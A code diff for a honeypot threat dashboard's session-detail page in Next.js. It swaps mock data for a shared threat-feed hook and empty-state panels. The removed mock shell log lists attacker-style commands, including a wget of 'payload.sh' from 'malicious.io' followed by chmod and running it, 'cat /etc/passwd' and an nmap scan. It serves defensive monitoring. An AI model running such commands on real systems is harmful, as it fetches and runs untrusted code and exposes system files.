@@ -1,294 +1,206 @@
 "use client";
-import { use, useState, useEffect } from "react";
-import { Download, MapPin, Terminal, Activity, FileText, ChevronRight, AlertTriangle } from "lucide-react";
+
+import { use, useMemo } from "react";
+import { AlertTriangle, ChevronRight, Download, FileText, MapPin, Terminal } from "lucide-react";
 import Link from "next/link";
 import { ComposableMap, Geographies, Geography, Marker } from "react-simple-maps";
-import { isDashboardThreatEvent } from "@/lib/dashboardTypes";
-import type { DashboardThreatEvent } from "@/lib/dashboardTypes";
+
+import { SeverityBadge } from "@/components/dashboard/SeverityBadge";
+import { useThreatFeed } from "@/components/threat/ThreatFeedProvider";
+import { RegionState } from "@/components/ui/RegionState";
 
 const geoUrl = "https://cdn.jsdelivr.net/npm/world-atlas@2/countries-110m.json";
 
 export default function SessionDetailPage({ params }: { params: Promise<{ id: string }> }) {
   const resolvedParams = use(params);
   const sessionId = resolvedParams.id;
-
-  const [threatData, setThreatData] = useState<DashboardThreatEvent | null>(null);
-  const [loading, setLoading] = useState(true);
-
-  useEffect(() => {
-    const fetchThreatDetail = async () => {
-      try {
-        // ดึงข้อมูลทั้งหมดมาก่อน แล้วหา ID ที่ตรงกับ URL (เพราะยังไม่มี API ดึงรายตัว)
-        const res = await fetch("/api/threats");
-        if (res.ok) {
-          const data: unknown = await res.json();
-          const found = Array.isArray(data) ? data.filter(isDashboardThreatEvent).find((t) => t.id === sessionId) : undefined;
-          if (found) {
-            setThreatData(found);
-          }
-        }
-      } catch (error) {
-        console.error("Failed to fetch threat details", error);
-      } finally {
-        setLoading(false);
-      }
-    };
-    fetchThreatDetail();
-  }, [sessionId]);
-
-  // ข้อมูลที่ต้องรอ API ในอนาคต (Mock Data)
-  const shellLogs = [
-    { time: "10:42:01", cmd: "$ whoami", action: "Deceive", actionDesc: "(root)", color: "text-purple-400 border-purple-900/50 bg-purple-900/20" },
-    { time: "10:42:15", cmd: "$ cat /etc/passwd", action: "Lure", actionDesc: "(Fake File)", color: "text-amber-400 border-amber-900/50 bg-amber-900/20" },
-    { time: "10:43:05", cmd: "$ wget http://malicious.io/payload.sh", action: "Delay", actionDesc: "(Throttle)", color: "text-slate-300 border-slate-700 bg-slate-800" },
-    { time: "10:44:30", cmd: "$ chmod +x payload.sh", action: "Deceive", actionDesc: "(Success)", color: "text-purple-400 border-purple-900/50 bg-purple-900/20" },
-    { time: "10:44:45", cmd: "$ ./payload.sh", action: "Contain", actionDesc: "(Sandbox)", color: "text-red-400 border-red-900/50 bg-red-900/20" },
-    { time: "10:45:12", cmd: "$ nmap -sV 10.0.0.0/24", action: "Analyzing...", actionDesc: "", color: "text-slate-500 border-transparent bg-transparent animate-pulse" },
-  ];
+  const { threats, status } = useThreatFeed();
+  const threatData = useMemo(() => threats.find((threat) => threat.id === sessionId) ?? null, [sessionId, threats]);
+  const loading = status === "loading";
+  const fetchFailed = status === "error";
 
   if (loading) {
-    return <div className="flex h-full items-center justify-center text-slate-500 font-mono text-sm animate-pulse min-h-[500px]">RETRIEVING FORENSIC DATA...</div>;
+    return <div className="min-h-[500px] py-16"><RegionState kind="loading" title="Loading session analysis" description="Retrieving the latest evidence for this session." /></div>;
+  }
+
+  if (fetchFailed) {
+    return <div className="min-h-[500px] py-16"><RegionState kind="error" title="Threat intelligence unavailable" description="This session could not be loaded because the session directory is currently unavailable." /></div>;
   }
 
   if (!threatData) {
-    return <div className="flex h-full items-center justify-center text-red-500 font-mono text-sm min-h-[500px]">ERROR: SESSION ARCHIVED OR NOT FOUND</div>;
+    return <div className="min-h-[500px] py-16"><RegionState kind="empty" title="ERROR: SESSION ARCHIVED OR NOT FOUND" description="The session was not included in the latest successful directory response." /></div>;
   }
 
-  // เตรียมข้อมูลจริงสำหรับแสดงผล
-  const originIp = threatData?.sourceIp || "Unknown";
-  const country = threatData?.geo?.country || "Unknown";
-  const city = threatData?.geo?.city || "Unknown";
-  const lat = threatData?.geo?.lat || 0;
-  const lon = threatData?.geo?.lon || 0;
-  const severity = threatData?.severity?.toUpperCase() || "UNKNOWN";
-  const classification = threatData?.classification || "UNKNOWN";
-  const confidenceScore = severity === "CRITICAL" ? "94%" : severity === "HIGH" ? "78%" : "45%";
-  
-  return (
-    <div className="space-y-6 animate-in fade-in duration-500 pb-10 max-w-[1400px] mx-auto">
-      
-      {/* ---------------- Header & Breadcrumbs ---------------- */}
-      <div className="flex flex-col gap-2 mb-6">
-        <div className="text-[10px] font-mono text-slate-500 uppercase tracking-widest flex items-center gap-2">
-           <Link href="/dashboard" className="hover:text-purple-400">SESSION ANALYSIS</Link> 
-           <ChevronRight className="w-3 h-3" /> 
-           <span className="text-purple-400 uppercase">{sessionId.substring(0, 8)}...</span>
-        </div>
-        <div className="flex justify-between items-center">
-          <h1 className="text-3xl font-bold text-white flex items-center gap-3">
-             Active Intrusion Session 
-             <span className="px-2 py-0.5 bg-red-500/20 text-red-500 text-[10px] border border-red-500/50 rounded flex items-center gap-1.5 font-mono">
-               <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse"></span> LIVE
-             </span>
-          </h1>
-          <button className="flex items-center gap-2 text-xs font-mono text-slate-300 bg-slate-800/50 border border-slate-700 px-4 py-2 rounded-md hover:bg-slate-700 transition">
-             <FileText className="w-4 h-4" /> Download Session PDF
-          </button>
-        </div>
-      </div>
+  const originIp = threatData.sourceIp || "Unknown";
+  const country = threatData.geo.country || "Unknown";
+  const city = threatData.geo.city || "Unknown";
+  const lat = threatData.geo.lat || 0;
+  const lon = threatData.geo.lon || 0;
+  const severity = threatData.severity || "Unknown";
+  const classification = threatData.classification || "Unknown";
+  const markerColor = severity === "Critical" ? "var(--danger)" : severity === "High" || severity === "Medium" ? "var(--warning)" : "var(--info)";
 
-      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
-        
-        {/* ---------------- Forensic Target Metadata ---------------- */}
-        <div className="lg:col-span-2 bg-[#111116] border border-slate-800/80 rounded-xl p-6 shadow-md flex flex-col">
-          <h3 className="text-lg font-bold text-slate-200 flex items-center gap-2 mb-6">
-             <MapPin className="w-5 h-5 text-purple-400" /> Forensic Target Metadata
-          </h3>
-          <div className="grid grid-cols-3 gap-4 mb-6">
-            <div>
-              <p className="text-[10px] font-mono text-slate-500 tracking-wider mb-1">ORIGIN IP</p>
-              <p className="text-lg font-mono text-purple-300">{originIp}</p>
-            </div>
-            <div>
-              <p className="text-[10px] font-mono text-slate-500 tracking-wider mb-1">GEO-LOCATION</p>
-              <p className="text-sm text-slate-200 flex items-start gap-1">
-                 <MapPin className="w-3 h-3 text-slate-500 mt-1 shrink-0" />
-                 {city !== "Unknown" ? `${city}, ` : ""}{country}
-              </p>
-            </div>
-            <div>
-              <p className="text-[10px] font-mono text-slate-500 tracking-wider mb-1">SESSION DURATION</p>
-              <p className="text-lg font-mono text-slate-200">-</p> {/* รอข้อมูลจริง */}
+  return (
+    <div className="space-y-7 pb-10">
+      <header className="flex flex-col gap-5 border-b border-border pb-6">
+        <div className="flex flex-wrap items-center gap-2 text-xs font-semibold uppercase tracking-[0.12em] text-text-subtle">
+          <Link href="/dashboard" className="text-primary hover:text-primary-action-hover">Session analysis</Link>
+          <ChevronRight className="h-3.5 w-3.5" aria-hidden="true" />
+          <span className="font-mono text-text-subtle">{sessionId.substring(0, 12)}{sessionId.length > 12 ? "…" : ""}</span>
+        </div>
+        <div className="flex flex-col justify-between gap-4 lg:flex-row lg:items-end">
+          <div>
+            <h1 className="text-2xl font-semibold leading-8 tracking-tight sm:text-[28px] sm:leading-9">Session analysis</h1>
+            <div className="mt-3 flex flex-wrap items-center gap-3">
+              <SeverityBadge severity={severity} />
+              <span className="text-sm text-text-muted">Observed session</span>
+              <span className="font-mono text-xs text-text-subtle">ID {sessionId}</span>
             </div>
           </div>
-          
-          {/* แผนที่ข้อมูลจริง */}
-          <div className="w-full h-[120px] bg-[#09090b] border border-slate-800/50 rounded-lg relative overflow-hidden mt-4">
-            <ComposableMap
-              projection="geoMercator"
-              projectionConfig={{
-                scale: 1200, 
-                center: [lon, lat] // ใช้พิกัดจริงจากข้อมูล
-              }}
-              style={{ width: "100%", height: "100%", outline: "none" }}
-            >
-              <Geographies geography={geoUrl}>
-                {({ geographies }) =>
-                  geographies.map((geo) => (
+          <div className="flex flex-wrap items-center gap-3">
+            <span id="pdf-export-status" className="text-xs text-text-subtle">PDF export is not available in the current workspace.</span>
+            <button type="button" disabled aria-describedby="pdf-export-status" className="ui-button" title="PDF export is not available">
+              <FileText className="h-4 w-4" aria-hidden="true" />
+              <Download className="h-3.5 w-3.5" aria-hidden="true" />
+              Download session PDF
+            </button>
+          </div>
+        </div>
+      </header>
+
+      <section className="grid grid-cols-1 gap-5 xl:grid-cols-12 xl:gap-6" aria-label="Session overview">
+        <article className="ui-panel flex min-h-[390px] flex-col overflow-hidden xl:col-span-8">
+          <div className="border-b border-border bg-surface px-5 py-4 sm:px-6">
+            <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-[0.12em] text-primary">
+              <MapPin className="h-4 w-4" aria-hidden="true" />
+              Session context
+            </div>
+            <h2 className="mt-1 text-base font-semibold sm:text-lg">Forensic target metadata</h2>
+          </div>
+          <div className="flex flex-1 flex-col p-5 sm:p-6">
+            <dl className="grid gap-5 border-b border-border pb-5 sm:grid-cols-3">
+              <div>
+                <dt className="text-xs font-medium uppercase tracking-[0.1em] text-text-subtle">Origin IP</dt>
+                <dd className="mt-2 break-all font-mono text-base text-primary">{originIp}</dd>
+              </div>
+              <div>
+                <dt className="text-xs font-medium uppercase tracking-[0.1em] text-text-subtle">Geo-location</dt>
+                <dd className="mt-2 flex items-start gap-2 text-sm text-text">
+                  <MapPin className="mt-0.5 h-4 w-4 shrink-0 text-text-subtle" aria-hidden="true" />
+                  {city !== "Unknown" ? `${city}, ` : ""}{country}
+                </dd>
+              </div>
+              <div>
+                <dt className="text-xs font-medium uppercase tracking-[0.1em] text-text-subtle">Session duration</dt>
+                <dd className="mt-2 font-mono text-base text-text">{threatData.duration || "Unavailable"}</dd>
+              </div>
+            </dl>
+
+            <div className="relative mt-5 min-h-[180px] flex-1 overflow-hidden rounded-lg border border-border bg-surface-subtle" aria-label="Session origin map">
+              <ComposableMap
+                projection="geoMercator"
+                projectionConfig={{ scale: 420, center: [lon, lat] }}
+                style={{ width: "100%", height: "100%" }}
+              >
+                <Geographies geography={geoUrl}>
+                  {({ geographies }) => geographies.map((geo) => (
                     <Geography
                       key={geo.rsmKey}
                       geography={geo}
-                      fill="#16161d"
-                      stroke="#27272a"
+                      fill="var(--map-land)"
+                      stroke="var(--map-border)"
                       strokeWidth={0.5}
                       style={{
                         default: { outline: "none" },
-                        hover: { fill: "#27272a", outline: "none" },
-                        pressed: { outline: "none" },
+                        hover: { fill: "var(--map-hover)", outline: "none" },
+                        pressed: { fill: "var(--map-hover)", outline: "none" },
                       }}
                     />
-                  ))
-                }
-              </Geographies>
-              
-              {/* จุดแจ้งเตือนตามพิกัดจริง */}
-              {(lat !== 0 && lon !== 0) && (
-                <Marker coordinates={[lon, lat]}>
-                  <circle r={6} fill="#a855f7" />
-                  <circle r={14} fill="#a855f7" opacity={0.4} className="animate-ping" />
-                  <text
-                    textAnchor="middle"
-                    y={-22}
-                    style={{ 
-                      fontFamily: "monospace", 
-                      fontSize: "22px", 
-                      fill: "#ffffff", 
-                      fontWeight: "bold",
-                      textShadow: "2px 2px 4px rgba(0,0,0,0.9), -1px -1px 0 #000" 
-                    }}
-                  >
-                    TARGET_NODE
-                  </text>
-                </Marker>
+                  ))}
+                </Geographies>
+                {lat !== 0 && lon !== 0 && (
+                  <Marker coordinates={[lon, lat]}>
+                    <title>{`Origin location · ${city}, ${country}`}</title>
+                    <circle r={6} fill={markerColor} stroke="var(--surface)" strokeWidth={2} />
+                    <text textAnchor="middle" y={-16} fill="var(--text)" fontSize={14} fontWeight={600}>Origin</text>
+                  </Marker>
+                )}
+              </ComposableMap>
+              {lat === 0 || lon === 0 ? (
+                <div className="absolute inset-0 grid place-items-center p-4">
+                  <RegionState kind="empty" title="Location unavailable" description="This session does not include usable coordinates." />
+                </div>
+              ) : (
+                <span className="pointer-events-none absolute bottom-3 left-3 rounded-md border border-border bg-surface px-2.5 py-1.5 font-mono text-xs text-text-subtle">Origin trace</span>
               )}
-            </ComposableMap>
-            
-            <div className="absolute bottom-3 right-4 text-[9px] font-mono text-slate-600 tracking-widest pointer-events-none">
-              GEOSPATIAL TRACE ACTIVE •
             </div>
           </div>
-        </div>
+        </article>
 
-        {/* ---------------- Attacker Profile ---------------- */}
-        <div className="bg-[#111116] border border-slate-800/80 rounded-xl p-6 shadow-md">
-          <h3 className="text-lg font-bold text-slate-200 flex items-center gap-2 mb-6">
-             <Activity className="w-5 h-5 text-amber-500" /> Attacker Profile
-          </h3>
-          <div className="flex justify-between items-end mb-8">
-             <div>
-               <p className="text-[10px] font-mono text-slate-500 tracking-wider mb-1">CLASSIFICATION</p>
-               <p className="text-3xl font-bold text-slate-200">{classification}</p>
-             </div>
-             <div className="text-right">
-               <p className="text-[10px] font-mono text-slate-500 tracking-wider mb-1">CRITICALITY</p>
-               <p className={`text-xs font-mono font-bold px-2 py-0.5 rounded border ${
-                 severity === 'CRITICAL' ? 'text-red-400 border-red-900 bg-red-950/30' : 
-                 severity === 'HIGH' ? 'text-orange-400 border-orange-900 bg-orange-950/30' : 
-                 'text-amber-400 border-amber-900 bg-amber-950/30'
-               }`}>
-                 {severity}
-               </p>
-             </div>
+        <article className="ui-panel flex min-h-[390px] flex-col p-5 sm:p-6 xl:col-span-4">
+          <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-[0.12em] text-primary">
+            <AlertTriangle className="h-4 w-4" aria-hidden="true" />
+            Assessment
           </div>
-          <div>
-             <div className="flex justify-between text-xs font-mono text-slate-400 mb-2">
-               <span>Confidence Score</span>
-               <span>{confidenceScore}</span>
-             </div>
-             <div className="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
-                <div className="h-full bg-purple-500 shadow-[0_0_8px_#a855f7]" style={{ width: confidenceScore }}></div>
-             </div>
+          <h2 className="mt-1 text-base font-semibold sm:text-lg">Attacker profile</h2>
+          <div className="mt-7 grid gap-5">
+            <div>
+              <p className="text-xs font-medium uppercase tracking-[0.1em] text-text-subtle">Classification</p>
+              <p className="mt-2 break-words text-2xl font-semibold text-text">{classification}</p>
+            </div>
+            <div>
+              <p className="text-xs font-medium uppercase tracking-[0.1em] text-text-subtle">Criticality</p>
+              <div className="mt-2"><SeverityBadge severity={severity} /></div>
+            </div>
           </div>
-        </div>
+          <div className="mt-auto rounded-lg border border-border bg-surface-subtle p-4">
+            <p className="text-sm font-semibold text-text">Analytical confidence</p>
+            <p className="mt-1 text-sm text-text-muted">Unavailable in the current session response.</p>
+          </div>
+        </article>
+      </section>
 
-        {/* ---------------- Live Interaction Shell (MOCK) ---------------- */}
-        <div className="lg:col-span-2 bg-[#111116] border border-slate-800/80 rounded-xl p-6 shadow-md">
-          <div className="flex justify-between items-center mb-6">
-             <h3 className="text-lg font-bold text-slate-200 flex items-center gap-2">
-                <Terminal className="w-5 h-5 text-slate-400" /> Live Interaction Shell
-             </h3>
-             <span className="text-[10px] font-mono text-purple-400 flex items-center gap-1.5">
-               <span className="w-1.5 h-1.5 rounded-full bg-purple-500 animate-pulse"></span> Recording
-             </span>
+      <section className="grid grid-cols-1 gap-5 xl:grid-cols-12 xl:gap-6" aria-label="Session evidence">
+        <article className="ui-panel flex min-h-[300px] flex-col overflow-hidden xl:col-span-8">
+          <div className="flex flex-wrap items-start justify-between gap-3 border-b border-border bg-surface px-5 py-4 sm:px-6">
+            <div>
+              <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-[0.12em] text-primary">
+                <Terminal className="h-4 w-4" aria-hidden="true" />
+                Evidence stream
+              </div>
+              <h2 className="mt-1 text-base font-semibold sm:text-lg">Live interaction shell</h2>
+            </div>
+            <span className="ui-badge">Not available</span>
           </div>
-          
-          <div className="bg-[#0a0a0c] border border-slate-800/50 rounded-lg p-4 font-mono text-xs overflow-x-auto">
-             <table className="w-full text-left border-collapse">
-               <thead>
-                 <tr className="text-slate-500 border-b border-slate-800/50">
-                   <th className="pb-3 w-24 font-normal">Time</th>
-                   <th className="pb-3 font-normal">Attacker Command</th>
-                   <th className="pb-3 w-32 font-normal text-right">Honeypot Action</th>
-                 </tr>
-               </thead>
-               <tbody className="divide-y divide-slate-800/30">
-                 {shellLogs.map((log, i) => (
-                   <tr key={i} className="text-slate-300">
-                     <td className="py-3 text-slate-500">{log.time}</td>
-                     <td className="py-3 text-emerald-400/80">{log.cmd}</td>
-                     <td className="py-3 text-right">
-                       <div className="flex flex-col items-end gap-1">
-                          <span className={`px-2 py-0.5 rounded text-[10px] border ${log.color}`}>
-                            {log.action}
-                          </span>
-                          {log.actionDesc && <span className="text-[9px] text-slate-500">{log.actionDesc}</span>}
-                       </div>
-                     </td>
-                   </tr>
-                 ))}
-               </tbody>
-             </table>
+          <div className="flex flex-1 items-center p-5 sm:p-6">
+            <RegionState kind="empty" title="Interaction evidence unavailable" description="Command history is not included in the current session response." />
           </div>
-        </div>
+        </article>
 
-        {/* ---------------- Predict Next Step (MOCK) ---------------- */}
-        <div className="bg-[#111116] border border-slate-800/80 rounded-xl p-6 shadow-md">
-          <h3 className="text-lg font-bold text-slate-200 flex items-center gap-2 mb-6">
-             <Activity className="w-5 h-5 text-purple-400" /> Predict Next Step
-          </h3>
-          <div className="space-y-6">
-             <div>
-               <div className="flex justify-between text-xs font-mono text-slate-300 mb-2">
-                 <span>Lateral Movement</span>
-                 <span className="text-red-400">88%</span>
-               </div>
-               <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden"><div className="h-full bg-red-400 w-[88%]"></div></div>
-             </div>
-             <div>
-               <div className="flex justify-between text-xs font-mono text-slate-300 mb-2">
-                 <span>Data Exfiltration</span>
-                 <span className="text-amber-400">72%</span>
-               </div>
-               <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden"><div className="h-full bg-amber-400 w-[72%]"></div></div>
-             </div>
-             <div>
-               <div className="flex justify-between text-xs font-mono text-slate-300 mb-2">
-                 <span>Privilege Escalation</span>
-                 <span className="text-purple-400">45%</span>
-               </div>
-               <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden"><div className="h-full bg-purple-400 w-[45%]"></div></div>
-             </div>
-             <div>
-               <div className="flex justify-between text-xs font-mono text-slate-300 mb-2">
-                 <span>Install Persistence</span>
-                 <span className="text-slate-500">12%</span>
-               </div>
-               <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden"><div className="h-full bg-slate-500 w-[12%]"></div></div>
-             </div>
+        <article className="ui-panel flex min-h-[300px] flex-col p-5 sm:p-6 xl:col-span-4">
+          <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-[0.12em] text-primary">
+            <AlertTriangle className="h-4 w-4" aria-hidden="true" />
+            Analysis
           </div>
-        </div>
-
-        {/* ---------------- Threat Hypothesis Summary (MOCK) ---------------- */}
-        <div className="lg:col-span-3 bg-[#111116] border border-slate-800/80 rounded-xl p-6 shadow-md">
-          <h3 className="text-lg font-bold text-slate-200 flex items-center gap-2 mb-4">
-             <AlertTriangle className="w-5 h-5 text-amber-500" /> Threat Hypothesis Summary
-          </h3>
-          <div className="p-4 bg-[#15151c] border border-slate-800 rounded-lg text-sm text-slate-400 leading-relaxed font-mono">
-            Based on the interaction sequence, the actor is attempting to map internal network topology following a successful initial compromise via SQL Injection. The execution of a secondary payload script suggests preparation for lateral movement, likely targeting domain controllers or credential stores. The honeypot&apos;s deception tactics (providing fake `/etc/passwd` and sandboxing the payload) have currently stalled their primary objective, forcing them into a reconnaissance loop using `nmap`. High probability of attempted data exfiltration if lateral movement is perceived as successful by the attacker.
+          <h2 className="mt-1 text-base font-semibold sm:text-lg">Predict next step</h2>
+          <div className="mt-6 flex flex-1 items-center">
+            <RegionState kind="empty" title="Prediction unavailable" description="No predictive assessment is included in the current session response." />
           </div>
-        </div>
+        </article>
+      </section>
 
-      </div>
+      <section className="ui-panel overflow-hidden" aria-labelledby="hypothesis-title">
+        <div className="border-b border-border bg-surface px-5 py-4 sm:px-6">
+          <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-[0.12em] text-primary">
+            <AlertTriangle className="h-4 w-4" aria-hidden="true" />
+            Evidence summary
+          </div>
+          <h2 id="hypothesis-title" className="mt-1 text-base font-semibold sm:text-lg">Threat hypothesis summary</h2>
+        </div>
+        <div className="p-5 sm:p-6">
+          <p className="rounded-lg border border-border bg-surface-subtle p-4 text-sm leading-6 text-text-muted">No evidence-backed summary is available in the current session response.</p>
+        </div>
+      </section>
     </div>
   );
 }
